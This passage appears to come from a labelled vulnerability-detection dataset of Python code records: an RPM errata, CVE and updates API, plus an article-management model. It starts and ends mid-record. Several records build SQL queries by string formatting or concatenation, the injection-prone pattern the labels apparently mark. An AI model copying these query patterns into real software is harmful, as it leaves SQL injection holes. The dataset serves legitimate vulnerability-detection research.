to,\n        associated erratum and repository this erratum is from.\n\n        :param packages_to_process: list of package to find updates for every of them\n\n        :returns: updates for a package in format of list of dictionaries {'package': <p_name>, 'erratum': <e_name>,\n        'repository': <r_name>}\n\n        \"\"\"\n\n        packages_to_process = data['package_list']\n        auxiliary_dict = {}\n        answer = {}\n\n        if not packages_to_process:\n            return answer\n\n        provided_repo_ids = None\n        provided_repo_names = None\n\n        if 'repository_list' in data:\n            provided_repo_names = data['repository_list']\n            provided_repo_ids = []\n            self.cursor.execute(\"select id from repo where name in %s;\", [tuple(provided_repo_names)])\n            for id_tuple in self.cursor.fetchall():\n                for id in id_tuple:\n                    provided_repo_ids.append(id)\n\n        # Select all evrs and put them into dictionary\n        self.cursor.execute(\"SELECT id, epoch, version, release from evr\")\n        evrs = self.cursor.fetchall()\n        evr2id_dict = {}\n        id2evr_dict = {}\n        for id, e, v, r in evrs:\n            key = e + ':' + v + ':' + r\n            evr2id_dict[key] = id\n            id2evr_dict[id] = {'epoch': e, 'version': v, 'release': r}\n\n        # Select all archs and put them into dictionary\n        self.cursor.execute(\"SELECT id, name from arch\")\n        archs = self.cursor.fetchall()\n        arch2id_dict = {}\n        id2arch_dict = {}\n        for id, name in archs:\n            arch2id_dict[name] = id\n            id2arch_dict[id] = name\n\n        packages_names = []\n        packages_evrids = []\n\n        for pkg in packages_to_process:\n            pkg = str(pkg)\n\n            # process all packages form input\n            if pkg not in auxiliary_dict:\n                n, v, r, e, a = split_filename(str(pkg))\n                auxiliary_dict[pkg] = {}  # create dictionary with aux data for pkg\n\n                evr_key = e + ':' + v + ':' + r\n                if evr_key in evr2id_dict:\n                    packages_names.append(n)\n                    auxiliary_dict[pkg][n] = []\n\n                    evr_id = evr2id_dict[evr_key]\n                    packages_evrids.append(evr_id)\n                    auxiliary_dict[pkg]['evr_id'] = evr_id\n                    auxiliary_dict[pkg]['arch_id'] = arch2id_dict[a]\n                    auxiliary_dict[pkg]['repo_id'] = []\n                    auxiliary_dict[pkg]['pkg_id'] = []\n                    auxiliary_dict[pkg]['update_id'] = []\n\n        # Select all packages with given evrs ids and put them into dictionary\n        self.cursor.execute(\"select id, name, evr_id, arch_id from package where evr_id in %s;\",  [tuple(packages_evrids)])\n        packs = self.cursor.fetchall()\n        nevra2pkg_id = {}\n        for id, name, evr_id, arch_id in packs:\n            key = name + ':' + str(evr_id) + ':' + str(arch_id)\n            if key not in nevra2pkg_id:\n                nevra2pkg_id[key] = [id]\n            else:\n                nevra2pkg_id[key].append(id)\n\n        pkg_ids = []\n        for pkg in auxiliary_dict.keys():\n            n, v, r, e, a = split_filename(str(pkg))\n\n            try:\n                key = str(n + ':' + str(auxiliary_dict[pkg]['evr_id']) + ':' + str(auxiliary_dict[pkg]['arch_id']))\n                pkg_ids.extend(nevra2pkg_id[key])\n                auxiliary_dict[pkg]['pkg_id'].extend(nevra2pkg_id[key])\n            except KeyError:\n                pass\n\n        # Select all repo_id and add mapping to package id\n        self.cursor.execute(\"select pkg_id, repo_id from pkg_repo where pkg_id in %s;\", [tuple(pkg_ids)])\n        pack_repo_ids = self.cursor.fetchall()\n        pkg_id2repo_id = {}\n\n        repo_ids = []\n\n        for pkg_id, repo_id in pack_repo_ids:\n            repo_ids.append(repo_id)\n\n            if pkg_id in pkg_id2repo_id:\n                pkg_id2repo_id[pkg_id].append(repo_id)\n            else:\n                pkg_id2repo_id[pkg_id] = [repo_id]\n\n        for pkg in auxiliary_dict.keys():\n                try:\n                    for pkg_id in auxiliary_dict[pkg]['pkg_id']:\n                        auxiliary_dict[pkg]['repo_id'].extend(pkg_id2repo_id[pkg_id])\n                except KeyError:\n                    pass\n\n        self.cursor.execute(\"select name, id from package where name in %s;\", [tuple(packages_names)])\n        sql_result = self.cursor.fetchall()\n        names2ids = {}\n        for name, id in sql_result:\n\n            if name in names2ids:\n                names2ids[name].append(id)\n            else:\n                names2ids[name] = [id]\n\n        for pkg in auxiliary_dict.keys():\n            n, v, r, e, a = split_filename(str(pkg))\n\n            try:\n                auxiliary_dict[pkg][n].extend(names2ids[n])\n            except KeyError:\n                pass\n\n        update_pkg_ids = []\n\n        sql = \"\"\"SELECT package.id\n                   FROM package\n                   JOIN evr ON package.evr_id = evr.id\n                  WHERE package.id in %s and evr.evr > (select evr from evr where id = %s)\"\"\"\n        for pkg in auxiliary_dict:\n            n, v, r, e, a = split_filename(str(pkg))\n\n            if n in auxiliary_dict[pkg] and auxiliary_dict[pkg][n]:\n                self.cursor.execute(sql, [tuple(auxiliary_dict[pkg][n]),\n                                          auxiliary_dict[pkg]['evr_id']])\n\n                for id in self.cursor.fetchall():\n                    auxiliary_dict[pkg]['update_id'].append(id[0])\n                    update_pkg_ids.append(id[0])\n\n        # Select all info about repos\n        self.cursor.execute(\"select id, name, url from repo where id in %s;\", [tuple(repo_ids)])\n        all_repos = self.cursor.fetchall()\n        repoinfo_dict = {}\n        for id, name, url in all_repos:\n            repoinfo_dict[id] = {'name': name, 'url': url}\n\n        # Select all info about pkg_id to repo_id\n        self.cursor.execute(\"select pkg_id, repo_id from pkg_repo where pkg_id in %s;\", [tuple(update_pkg_ids)])\n        all_pkg_repos = self.cursor.fetchall()\n        pkg_id2repo_id = {}\n        for pkg_id, repo_id in all_pkg_repos:\n\n            if pkg_id not in pkg_id2repo_id:\n                pkg_id2repo_id[pkg_id] = [repo_id]\n            else:\n                pkg_id2repo_id[pkg_id].append(repo_id)\n\n        # Select all info about pkg_id to errata_id\n        self.cursor.execute(\"select pkg_id, errata_id from pkg_errata where pkg_id in %s;\", [tuple(update_pkg_ids)])\n        all_pkg_errata = self.cursor.fetchall()\n        pkg_id2errata_id = {}\n        all_errata = []\n        for pkg_id, errata_id in all_pkg_errata:\n            all_errata.append(errata_id)\n            if pkg_id not in pkg_id2errata_id:\n                pkg_id2errata_id[pkg_id] = [errata_id]\n            else:\n                pkg_id2errata_id[pkg_id].append(errata_id)\n\n        # Select all info about errata\n        self.cursor.execute(\"SELECT id, name from errata where id in %s;\", [tuple(all_errata)])\n        errata = self.cursor.fetchall()\n        id2errata_dict = {}\n        all_errata_id = []\n        for id, name in errata:\n            id2errata_dict[id] = name\n            all_errata_id.append(id)\n\n        self.cursor.execute(\"SELECT errata_id, repo_id from errata_repo where errata_id in %s;\", [tuple(all_errata_id)])\n        sql_result = self.cursor.fetchall()\n        errata_id2repo_id = {}\n        for errata_id, repo_id in sql_result:\n            if errata_id not in errata_id2repo_id:\n                errata_id2repo_id[errata_id] = [repo_id]\n            else:\n                errata_id2repo_id[errata_id].append(repo_id)\n\n        # Select all info about packages\n        self.cursor.execute(\"SELECT id, name, evr_id, arch_id from package where id in %s;\", [tuple(update_pkg_ids)])\n        packages = self.cursor.fetchall()\n        pkg_id2full_name = {}\n        pkg_id2arch_id = {}\n        for id, name, evr_id, arch_id in packages:\n            full_rpm_name = name + '-'\n            if id2evr_dict[evr_id]['epoch'] != '0':\n                full_rpm_name += id2evr_dict[evr_id]['epoch'] + ':'\n            full_rpm_name += id2evr_dict[evr_id]['version'] + '-' + id2evr_dict[evr_id]['release'] + '.' + id2arch_dict[arch_id]\n\n            pkg_id2full_name[id] = full_rpm_name\n            pkg_id2arch_id[id] = arch_id\n\n        for pkg in auxiliary_dict:\n            answer[pkg] = []\n\n            if 'update_id' not in auxiliary_dict[pkg]:\n                continue\n\n            for upd_pkg_id in auxiliary_dict[pkg]['update_id']:\n                # FIXME: use compatibility tables instead of exact matching\n                if auxiliary_dict[pkg]['arch_id'] == pkg_id2arch_id[upd_pkg_id]:\n                    for r_id in pkg_id2repo_id[upd_pkg_id]:\n                        # check if update package in the same repo with original one\n                        # and if the list of repositories for updates is provided, also check repo id in this list\n                        if r_id in auxiliary_dict[pkg]['repo_id'] and \\\n                                (provided_repo_ids is None or r_id in provided_repo_ids):\n                            # Some pkgs don't have associated errata (eg, original-repo-content)\n                            if upd_pkg_id in pkg_id2errata_id:\n                                errata_ids = pkg_id2errata_id[upd_pkg_id]\n                                for e_id in errata_ids:\n                                    # check current errata in the same repo with update pkg\n                                    if r_id in errata_id2repo_id[e_id]:\n                                        e_name = id2errata_dict[e_id]\n                                        r_name = repoinfo_dict[r_id]['name']\n\n                                        answer[pkg].append({\n                                            'package': pkg_id2full_name[upd_pkg_id],\n                                            'erratum': e_name,\n                                            'repository': r_name})\n        response = {\n            'update_list': answer,\n        }\n\n        if provided_repo_ids is not None:\n            response.update({'repository_list': provided_repo_names})\n\n        return response\n\n/n/n/n", "label": 0}, {"id": "49603ff9d29a9d411a681b3cc8096a6585ec1272", "code": "/webapp/cve.py/n/n\"\"\"\nModule contains functions and CVE class for returning data from DB\n\"\"\"\n\n\nclass CVE:\n    \"\"\"\n    Class to hold CVE attributes\n    \"\"\"\n    cve_cwe_map = None\n\n    def __init__(self, cve_entry, column_names):\n        for col_name in column_names:\n            setattr(self, col_name, cve_entry[column_names.index(col_name)])\n        self.cwe = self.associate_cwes()\n\n    def associate_cwes(self):\n        \"\"\"\n        Assigns cve to cwe and creates a list\n        :return:\n        \"\"\"\n        cwe_map = []\n        if CVE.cve_cwe_map is not None:\n            cwe_map = [item[1] for item in CVE.cve_cwe_map if self.get_val(\"cve.id\") == item[0]]\n        return cwe_map\n\n    def get_val(self, attr_name):\n        \"\"\"\n        Return CVE attribute or None\n        :param attr_name: attr_name\n        :return: attribute\n        \"\"\"\n        value = None\n        if attr_name in vars(self):\n            value = getattr(self, attr_name)\n        return value\n\nclass CveAPI:\n    def __init__(self, cursor):\n        self.cursor = cursor\n\n    def process_list(self, data):\n        \"\"\"\n        This method returns details for given set of CVEs.\n\n        :param data: data obtained from api, we're interested in data[\"cve_list\"]\n\n        :returns: list of dictionaries containing detailed information for given cve list}\n\n        \"\"\"\n\n        cves_to_process = data[\"cve_list\"]\n        cves_to_process = filter(None, cves_to_process)\n        answer = {}\n        if not cves_to_process:\n            return answer\n\n        # Select all cves in request\n        column_names = [\"cve.id\", \"redhat_url\", \"secondary_url\", \"cve.name\", \"severity.name\", \"published_date\",\n                        \"modified_date\", \"iava\", \"description\"]\n        cve_query = \"SELECT %s from cve\" % ', '.join(column for column in column_names)\n        cve_query = cve_query + \" LEFT JOIN severity ON severity_id = severity.id\"\n        cve_query = cve_query + \" WHERE cve.name IN %s\"\n        self.cursor.execute(cve_query, [tuple(cves_to_process)])\n        cves = self.cursor.fetchall()\n        cwe_map = self.get_cve_cwe_map([cve[column_names.index(\"cve.id\")] for cve in cves])  # generate cve ids\n        CVE.cve_cwe_map = cwe_map\n        cve_list = []\n        for cve_entry in cves:\n            cve = CVE(cve_entry, column_names)\n            cve_list.append(cve)\n\n        return self.construct_answer(cve_list)\n\n\n    def get_cve_cwe_map(self, ids):\n        \"\"\"\n        For givers CVE ids find CWE in DB\n        :param ids: CVE ids\n        :return: cve_cwe mapping\n        \"\"\"\n        if not ids:\n            return []\n        query = \"SELECT cve_id, cwe.name, cwe.link FROM cve_cwe map JOIN cwe ON map.cwe_id = cwe.id WHERE map.cve_id IN %s\"\n        self.cursor.execute(query, [tuple(ids)])\n        return self.cursor.fetchall()\n\n\n    @staticmethod\n    def construct_answer(cve_list):\n        \"\"\"\n        Final dictionary generation\n        :param cve_list: which cves to show\n        :return: JSON ready dictionary\n        \"\"\"\n        response = {}\n        for cve in cve_list:\n            response[cve.get_val(\"cve.name\")] = {\n                \"redhat_url\": cve.get_val(\"redhat_url\"),\n                \"secondary_url\": cve.get_val(\"secondary_url\"),\n                \"synopsis\": cve.get_val(\"cve.name\"),\n                \"impact\": cve.get_val(\"severity.name\"),\n                \"public_date\": cve.get_val(\"published_date\"),\n                \"modified_date\": cve.get_val(\"modified_date\"),\n                \"iava\": cve.get_val(\"iava\"),\n                \"cwe_list\": cve.get_val(\"cwe\"),\n                \"description\": cve.get_val(\"description\"),\n            }\n        return response\n/n/n/n/webapp/errata.py/n/n\"\"\"\nModule contains classes for returning errata data from DB\n\"\"\"\n\nclass Errata:\n    \"\"\"\n    Class to hold Erratum attributes\n    \"\"\"\n\n    def __init__(self, id, name, synopsis, severity, description, solution, issued, updated):\n        setattr(self, \"name\", name)\n        setattr(self, \"id\", id)\n        mydict = {}\n        mydict[\"type\"] = None\n        mydict[\"issued\"] = str(issued)\n        mydict[\"synopsis\"] = synopsis\n        mydict[\"description\"] = description\n        mydict[\"solution\"] = solution\n        mydict[\"severity\"] = severity\n        mydict[\"summary\"] = None\n        mydict[\"updated\"] = str(updated)\n        mydict[\"url\"] = \"https://access.redhat.com/errata/%s\" % name\n        mydict[\"bugzilla_list\"] = []\n        mydict[\"cve_list\"] = []\n        mydict[\"package_list\"] = []\n        mydict[\"reference_list\"] = []\n        setattr(self, \"mydict\", mydict)\n\n    def set_cve_names(self, cve_name_list):\n        mydict = self.get_val(\"mydict\")\n        mydict[\"cve_list\"] = cve_name_list\n\n    def set_packages(self, package_list):\n        mydict = self.get_val(\"mydict\")\n        mydict[\"package_list\"] = package_list\n\n    def get_val(self, attr_name):\n        \"\"\"\n        Return Erratum attribute or None\n        :param attr_name: attr_name\n        :return: attribute\n        \"\"\"\n        value = None\n        if attr_name in vars(self):\n            value = getattr(self, attr_name)\n        return value\n\nclass ErrataAPI:\n    def __init__(self, cursor):\n        self.cursor = cursor\n\n    def get_cve_names_for_erratum_id(self, id):\n        \"\"\"\n        Get the list of cves for the given erratum id\n        \"\"\"\n        cve_query = \"SELECT name FROM cve\"\n        cve_query += \" JOIN errata_cve ON cve_id = cve.id\"\n        cve_query += \" WHERE errata_cve.errata_id = %s\" % str(id)\n        self.cursor.execute(cve_query)\n        cve_names = self.cursor.fetchall()\n        cve_name_list = []\n        for cve_name in cve_names:\n            cve_name_list.append(cve_name[0])\n        return cve_name_list\n\n    @staticmethod\n    def build_package_name(name, epoch, version, release, arch):\n        \"\"\"\n        Build a package name from the separate NEVRA parts\n        \"\"\"\n        package_name = name + \"-\"\n        if int(epoch) > 0:\n            package_name += \"%s:\" % epoch\n        package_name += \"%s-%s.%s\" % (version, release, arch)\n        return package_name\n\n    def get_package_list_for_erratum_id(self, id):\n        \"\"\"\n        Get the list of packages for the given erratum id\n        \"\"\"\n        pkg_query = \"SELECT package.name, evr.epoch, evr.version, evr.release, arch.name\"\n        pkg_query += \" FROM pkg_errata\"\n        pkg_query += \" JOIN package ON package.id = pkg_errata.pkg_id\"\n        pkg_query += \" JOIN evr ON evr.id = package.evr_id\"\n        pkg_query += \" JOIN arch ON arch.id = package.arch_id\"\n        pkg_query += \" WHERE pkg_errata.errata_id = %s\" % str(id)\n        self.cursor.execute(pkg_query)\n        result = self.cursor.fetchall()\n        package_list = []\n        for name, epoch, version, release, arch in result:\n            package_list.append(self.build_package_name(name, epoch, version, release, arch))\n        return package_list\n\n    def process_list(self, data):\n        \"\"\"\n        This method returns details for given set of Errata.\n\n        :param cursor: psycopg2 connection cursor\n        :param data: data obtained from api, we're interested in data[\"errata_list\"]\n\n        :returns: dictionary containing detailed information for given errata list}\n\n        \"\"\"\n\n        errata_to_process = data[\"errata_list\"]\n        errata_to_process = filter(None, errata_to_process)\n        answer = {}\n\n        if not errata_to_process:\n            return answer\n\n        # Select all errata in request\n        errata_query = \"SELECT errata.id, errata.name, synopsis, severity.name, description,\"\n        errata_query += \" solution, issued, updated\"\n        errata_query += \" FROM errata\"\n        errata_query += \" LEFT JOIN severity ON severity_id = severity.id\"\n        errata_query += \" WHERE errata.name IN %s\"\n        self.cursor.execute(errata_query, [tuple(errata_to_process)])\n        errata = self.cursor.fetchall()\n\n        erratum_list = []\n        for id, name, synopsis, severity, description, solution, issued, updated in errata:\n            new_erratum = Errata(id, name, synopsis, severity, description, solution, issued, updated)\n            new_erratum.set_cve_names(self.get_cve_names_for_erratum_id(id))\n            new_erratum.set_packages(self.get_package_list_for_erratum_id(id))\n            erratum_list.append(new_erratum)\n\n        errata_dict = {}\n        for e in erratum_list:\n            errata_dict[e.get_val(\"name\")] = e.get_val(\"mydict\")\n        answer[\"errata_list\"] = errata_dict\n        return answer\n/n/n/n/webapp/updates.py/n/n#!/usr/bin/python -u\n\n\ndef split_filename(filename):\n    \"\"\"\n    Pass in a standard style rpm fullname\n\n    Return a name, version, release, epoch, arch, e.g.::\n        foo-1.0-1.i386.rpm returns foo, 1.0, 1, 0, i386\n        bar-1:9-123a.ia64.rpm returns bar, 9, 123a, 1, ia64\n    \"\"\"\n\n    is_epoch = True if filename.find(':') != -1 else False\n\n    if filename[-4:] == '.rpm':\n        filename = filename[:-4]\n\n    arch_index = filename.rfind('.')\n    arch = filename[arch_index + 1:]\n\n    rel_index = filename[:arch_index].rfind('-')\n    rel = filename[rel_index + 1:arch_index]\n\n    if is_epoch:\n        ver_index = filename[:rel_index].rfind(':')\n    else:\n        ver_index = filename[:rel_index].rfind('-')\n    ver = filename[ver_index + 1:rel_index]\n\n\n    if is_epoch:\n        epoch_index = filename[:ver_index].rfind('-')\n        epoch = filename[epoch_index + 1:ver_index]\n    else:\n        epoch_index = ver_index\n        epoch = '0'\n\n    name = filename[:epoch_index]\n    return name, ver, rel, epoch, arch\n\n\nclass UpdatesAPI:\n    def __init__(self, cursor):\n        self.cursor = cursor\n\n    def process_list(self, data):\n        \"\"\"\n        This method is looking for updates of a package, including name of package to update to,\n        associated erratum and repository this erratum is from.\n\n        :param packages_to_process: list of package to find updates for every of them\n\n        :returns: updates for a package in format of list of dictionaries {'package': <p_name>, 'erratum': <e_name>,\n        'repository': <r_name>}\n\n        \"\"\"\n\n        packages_to_process = data['package_list']\n        auxiliary_dict = {}\n        answer = {}\n\n        if not packages_to_process:\n            return answer\n\n        provided_repo_ids = None\n        provided_repo_names = None\n\n        if 'repository_list' in data:\n            provided_repo_names = data['repository_list']\n            provided_repo_ids = []\n            self.cursor.execute(\"select id from repo where name in %s;\", [tuple(provided_repo_names)])\n            for id_tuple in self.cursor.fetchall():\n                for id in id_tuple:\n                    provided_repo_ids.append(id)\n\n        # Select all evrs and put them into dictionary\n        self.cursor.execute(\"SELECT id, epoch, version, release from evr\")\n        evrs = self.cursor.fetchall()\n        evr2id_dict = {}\n        id2evr_dict = {}\n        for id, e, v, r in evrs:\n            key = e + ':' + v + ':' + r\n            evr2id_dict[key] = id\n            id2evr_dict[id] = {'epoch': e, 'version': v, 'release': r}\n\n        # Select all archs and put them into dictionary\n        self.cursor.execute(\"SELECT id, name from arch\")\n        archs = self.cursor.fetchall()\n        arch2id_dict = {}\n        id2arch_dict = {}\n        for id, name in archs:\n            arch2id_dict[name] = id\n            id2arch_dict[id] = name\n\n        packages_names = []\n        packages_evrids = []\n\n        for pkg in packages_to_process:\n            pkg = str(pkg)\n\n            # process all packages form input\n            if pkg not in auxiliary_dict:\n                n, v, r, e, a = split_filename(str(pkg))\n                auxiliary_dict[pkg] = {}  # create dictionary with aux data for pkg\n\n                evr_key = e + ':' + v + ':' + r\n                if evr_key in evr2id_dict:\n                    packages_names.append(n)\n                    auxiliary_dict[pkg][n] = []\n\n                    evr_id = evr2id_dict[evr_key]\n                    packages_evrids.append(evr_id)\n                    auxiliary_dict[pkg]['evr_id'] = evr_id\n                    auxiliary_dict[pkg]['arch_id'] = arch2id_dict[a]\n                    auxiliary_dict[pkg]['repo_id'] = []\n                    auxiliary_dict[pkg]['pkg_id'] = []\n                    auxiliary_dict[pkg]['update_id'] = []\n\n        # Select all packages with given evrs ids and put them into dictionary\n        self.cursor.execute(\"select id, name, evr_id, arch_id from package where evr_id in %s;\",  [tuple(packages_evrids)])\n        packs = self.cursor.fetchall()\n        nevra2pkg_id = {}\n        for id, name, evr_id, arch_id in packs:\n            key = name + ':' + str(evr_id) + ':' + str(arch_id)\n            if key not in nevra2pkg_id:\n                nevra2pkg_id[key] = [id]\n            else:\n                nevra2pkg_id[key].append(id)\n\n        pkg_ids = []\n        for pkg in auxiliary_dict.keys():\n            n, v, r, e, a = split_filename(str(pkg))\n\n            try:\n                key = str(n + ':' + str(auxiliary_dict[pkg]['evr_id']) + ':' + str(auxiliary_dict[pkg]['arch_id']))\n                pkg_ids.extend(nevra2pkg_id[key])\n                auxiliary_dict[pkg]['pkg_id'].extend(nevra2pkg_id[key])\n            except KeyError:\n                pass\n\n        # Select all repo_id and add mapping to package id\n        self.cursor.execute(\"select pkg_id, repo_id from pkg_repo where pkg_id in %s;\", [tuple(pkg_ids)])\n        pack_repo_ids = self.cursor.fetchall()\n        pkg_id2repo_id = {}\n\n        repo_ids = []\n\n        for pkg_id, repo_id in pack_repo_ids:\n            repo_ids.append(repo_id)\n\n            if pkg_id in pkg_id2repo_id:\n                pkg_id2repo_id[pkg_id].append(repo_id)\n            else:\n                pkg_id2repo_id[pkg_id] = [repo_id]\n\n        for pkg in auxiliary_dict.keys():\n                try:\n                    for pkg_id in auxiliary_dict[pkg]['pkg_id']:\n                        auxiliary_dict[pkg]['repo_id'].extend(pkg_id2repo_id[pkg_id])\n                except KeyError:\n                    pass\n\n        self.cursor.execute(\"select name, id from package where name in %s;\", [tuple(packages_names)])\n        sql_result = self.cursor.fetchall()\n        names2ids = {}\n        for name, id in sql_result:\n\n            if name in names2ids:\n                names2ids[name].append(id)\n            else:\n                names2ids[name] = [id]\n\n        for pkg in auxiliary_dict.keys():\n            n, v, r, e, a = split_filename(str(pkg))\n\n            try:\n                auxiliary_dict[pkg][n].extend(names2ids[n])\n            except KeyError:\n                pass\n\n        update_pkg_ids = []\n\n        for pkg in auxiliary_dict:\n            n, v, r, e, a = split_filename(str(pkg))\n\n            if n in auxiliary_dict[pkg] and auxiliary_dict[pkg][n]:\n                sql = \"\"\"\n                select package.id from package join evr on package.evr_id = evr.id where package.id in %s and evr.evr > (select evr from evr where id = %s);\n                \"\"\" % ('%s', str(auxiliary_dict[pkg]['evr_id']))\n\n                self.cursor.execute(sql, [tuple(auxiliary_dict[pkg][n])])\n\n                for id in self.cursor.fetchall():\n                    auxiliary_dict[pkg]['update_id'].append(id[0])\n                    update_pkg_ids.append(id[0])\n\n        # Select all info about repos\n        self.cursor.execute(\"select id, name, url from repo where id in %s;\", [tuple(repo_ids)])\n        all_repos = self.cursor.fetchall()\n        repoinfo_dict = {}\n        for id, name, url in all_repos:\n            repoinfo_dict[id] = {'name': name, 'url': url}\n\n        # Select all info about pkg_id to repo_id\n        self.cursor.execute(\"select pkg_id, repo_id from pkg_repo where pkg_id in %s;\", [tuple(update_pkg_ids)])\n        all_pkg_repos = self.cursor.fetchall()\n        pkg_id2repo_id = {}\n        for pkg_id, repo_id in all_pkg_repos:\n\n            if pkg_id not in pkg_id2repo_id:\n                pkg_id2repo_id[pkg_id] = [repo_id]\n            else:\n                pkg_id2repo_id[pkg_id].append(repo_id)\n\n        # Select all info about pkg_id to errata_id\n        self.cursor.execute(\"select pkg_id, errata_id from pkg_errata where pkg_id in %s;\", [tuple(update_pkg_ids)])\n        all_pkg_errata = self.cursor.fetchall()\n        pkg_id2errata_id = {}\n        all_errata = []\n        for pkg_id, errata_id in all_pkg_errata:\n            all_errata.append(errata_id)\n            if pkg_id not in pkg_id2errata_id:\n                pkg_id2errata_id[pkg_id] = [errata_id]\n            else:\n                pkg_id2errata_id[pkg_id].append(errata_id)\n\n        # Select all info about errata\n        self.cursor.execute(\"SELECT id, name from errata where id in %s;\", [tuple(all_errata)])\n        errata = self.cursor.fetchall()\n        id2errata_dict = {}\n        all_errata_id = []\n        for id, name in errata:\n            id2errata_dict[id] = name\n            all_errata_id.append(id)\n\n        self.cursor.execute(\"SELECT errata_id, repo_id from errata_repo where errata_id in %s;\", [tuple(all_errata_id)])\n        sql_result = self.cursor.fetchall()\n        errata_id2repo_id = {}\n        for errata_id, repo_id in sql_result:\n            if errata_id not in errata_id2repo_id:\n                errata_id2repo_id[errata_id] = [repo_id]\n            else:\n                errata_id2repo_id[errata_id].append(repo_id)\n\n        # Select all info about packages\n        self.cursor.execute(\"SELECT id, name, evr_id, arch_id from package where id in %s;\", [tuple(update_pkg_ids)])\n        packages = self.cursor.fetchall()\n        pkg_id2full_name = {}\n        pkg_id2arch_id = {}\n        for id, name, evr_id, arch_id in packages:\n            full_rpm_name = name + '-'\n            if id2evr_dict[evr_id]['epoch'] != '0':\n                full_rpm_name += id2evr_dict[evr_id]['epoch'] + ':'\n            full_rpm_name += id2evr_dict[evr_id]['version'] + '-' + id2evr_dict[evr_id]['release'] + '.' + id2arch_dict[arch_id]\n\n            pkg_id2full_name[id] = full_rpm_name\n            pkg_id2arch_id[id] = arch_id\n\n        for pkg in auxiliary_dict:\n            answer[pkg] = []\n\n            if 'update_id' not in auxiliary_dict[pkg]:\n                continue\n\n            for upd_pkg_id in auxiliary_dict[pkg]['update_id']:\n                # FIXME: use compatibility tables instead of exact matching\n                if auxiliary_dict[pkg]['arch_id'] == pkg_id2arch_id[upd_pkg_id]:\n                    for r_id in pkg_id2repo_id[upd_pkg_id]:\n                        # check if update package in the same repo with original one\n                        # and if the list of repositories for updates is provided, also check repo id in this list\n                        if r_id in auxiliary_dict[pkg]['repo_id'] and \\\n                                (provided_repo_ids is None or r_id in provided_repo_ids):\n                            # Some pkgs don't have associated errata (eg, original-repo-content)\n                            if upd_pkg_id in pkg_id2errata_id:\n                                errata_ids = pkg_id2errata_id[upd_pkg_id]\n                                for e_id in errata_ids:\n                                    # check current errata in the same repo with update pkg\n                                    if r_id in errata_id2repo_id[e_id]:\n                                        e_name = id2errata_dict[e_id]\n                                        r_name = repoinfo_dict[r_id]['name']\n\n                                        answer[pkg].append({\n                                            'package': pkg_id2full_name[upd_pkg_id],\n                                            'erratum': e_name,\n                                            'repository': r_name})\n        response = {\n            'update_list': answer,\n        }\n\n        if provided_repo_ids is not None:\n            response.update({'repository_list': provided_repo_names})\n\n        return response\n\n/n/n/n", "label": 1}, {"id": "3b85c99a373267bb85b1c9d88aab3f0c38494606", "code": "application/articles/models.py/n/nfrom application import db, os\nfrom application.help import getArticlesWithCondition\nfrom application.models import Base\nfrom sqlalchemy.sql import text\n\nclass Article(Base):\n\n      name = db.Column(db.String(144), nullable=False)\n      issue = db.Column(db.Integer, db.ForeignKey('issue.id'), nullable=True)\n      pages = db.Column(db.Integer, nullable=True)\n      editor_in_charge = db.Column(db.Integer, db.ForeignKey('account.id'), nullable=True)\n      editing_status = db.Column(db.Integer, nullable=False)\n      editing_status_text = db.Column(db.String(144), nullable=True)\n      writer = db.Column(db.Integer, db.ForeignKey('account.id'), nullable=True)\n      writing_status = db.Column(db.Integer, nullable=False)\n      writing_status_text = db.Column(db.String(144), nullable=True)\n      title = db.Column(db.String(144), nullable=True)\n      subtitle = db.Column(db.String(144), nullable=True)\n      TOC_text = db.Column(db.String(144), nullable=True)\n      language_consultant = db.Column(db.Integer, db.ForeignKey('account.id'), nullable=True)\n      lenght_in_chars = db.Column(db.Integer, nullable=True)\n      language_consultation_status = db.Column(db.Integer, nullable=False)\n      language_consultation_status_text = db.Column(db.String(144), nullable=True)\n      layout_artist = db.Column(db.Integer, db.ForeignKey('account.id'), nullable=True)\n      layout_status = db.Column(db.Integer, nullable=False)\n      layout_status_text = db.Column(db.String(144), nullable=True)\n      ready = db.Column(db.Boolean, nullable=False)\n\n      created_by = db.Column(db.Integer, db.ForeignKey('account.id'), nullable=False)\n      synopsis = db.Column(db.Integer, db.ForeignKey('synopsis.id'), nullable=True)\n\n\n      def __init__(self, name, created_by):\n            self.name = name\n            self.ready = False\n            self.editing_status = 0\n            self.writing_status = 0\n            self.language_consultation_status = 0\n            self.layout_status = 0\n            self.created_by = created_by\n\n      def set_writer(self, writer_id):\n            if writer_id == 0:\n                  self.writer = None\n            else:\n                  self.writer = writer_id\n\n\n      def set_editor(self, editor_id):\n            if editor_id == 0:\n                  self.editor_in_charge = None\n            else:\n                  self.editor_in_charge = editor_id\n\n      def set_issue(self, issue_id):\n            if issue_id == 0:\n                  self.issue = None\n            else:\n                  self.issue = issue_id\n\n      def set_name(self, name):\n            self.name = name\n\n\n      @staticmethod\n      def get_all_articles():\n            return getArticlesWithCondition(\"0=0\")\n\n      @staticmethod\n      def get_all_planned_articles(issue=0):\n            issuecondition = get_issue_condition(issue)\n            condition = \"Article.writing_status = 0\" + issuecondition\n            return getArticlesWithCondition(condition)\n\n      @staticmethod\n      def get_all_draft_articles(issue=0):\n            issuecondition = get_issue_condition(issue)\n            condition = \"Article.writing_status > 0 AND\" + \\\n                  \" Article.writing_status < 100\" + issuecondition\n            return getArticlesWithCondition(condition)\n\n      @staticmethod\n      def get_all_written_articles(issue=0):\n            issuecondition = get_issue_condition(issue)\n            condition = \"Article.writing_status = 100 AND\" + \\\n                  \" Article.editing_status < 100\" + issuecondition\n            return getArticlesWithCondition(condition)\n\n      @staticmethod\n      def get_all_edited_articles(issue=0):\n            issuecondition = get_issue_condition(issue)\n            condition = \"article.editing_status = 100 AND\" + \\\n                  \" Article.ready = %s\" % (\"false\" if os.environ.get(\"HEROKU\") else \"0\") + \\\n                  issuecondition\n            return getArticlesWithCondition(condition)\n\n      @staticmethod\n      def get_all_finished_articles(issue=0):\n            issuecondition = get_issue_condition(issue)\n            condition = \"Article.ready = %s\" % (\"true\" if os.environ.get(\"HEROKU\") else \"1\") + \\\n                  issuecondition\n            return getArticlesWithCondition(condition)\n\nclass Synopsis(Base):\n      article_id = db.Column(db.Integer, db.ForeignKey('article.id'), nullable=False)\n      content = db.Column(db.String(288), nullable=True)\n\n      def __init__(self, article_id, content):\n            self.article_id = article_id\n            self.content = content\n\n      def set_content(self, content):\n            self.content = content\n\ndef get_issue_condition(issue):\n      issuecondition = \"\"\n      if issue != 0 and isinstance(issue, int):\n            issue = str(issue)\n            issuecondition = \" AND Article.issue = \" + issue\n      return issuecondition\n/n/n/napplication/help.py/n/nfrom application import db, os\nfrom sqlalchemy.sql import text\n\ndef 